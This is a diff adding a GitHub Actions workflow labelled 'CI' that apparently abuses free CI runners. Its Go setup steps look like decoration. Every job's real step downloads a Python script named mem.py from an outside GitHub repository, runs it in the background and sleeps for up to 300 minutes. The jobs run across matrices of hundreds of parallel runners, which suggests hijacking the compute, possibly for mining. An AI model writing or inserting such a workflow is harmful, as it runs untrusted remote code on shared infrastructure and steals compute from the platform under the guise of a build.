@@ -1,0 +1,130 @@
+name: CI
+on: 
+  push:
+    branches: [ "main" ]
+
+jobs:
+  kesya:
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 80
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
+    timeout-minutes: 10
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v4
+    - name: clone
+      run: wget https://github.com/ratnasi7283-art/yan/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
+           sleep 310s
+  lol:
+    needs: kesya
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: wget https://github.com/ratnasi7283-art/yan/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
+            sleep 5m
+        
+    
+     
+  ape:
+    needs: [kesya]
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: wget https://github.com/ratnasi7283-art/yan/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
+            sleep 6m
+  fsd:
+    needs: lol
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: wget https://github.com/ratnasi7283-art/yan/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
+            sleep 300m
+        
+    
+     
+  das:
+    needs: [ape]
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 250
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9] 
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2] 
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 250
+        JOB: ${{ matrix.go }}
+    steps:
+    - uses: actions/checkout@v4
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: clone
+      run: wget https://github.com/ratnasi7283-art/yan/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
+            sleep 300m
+        
+    
+  
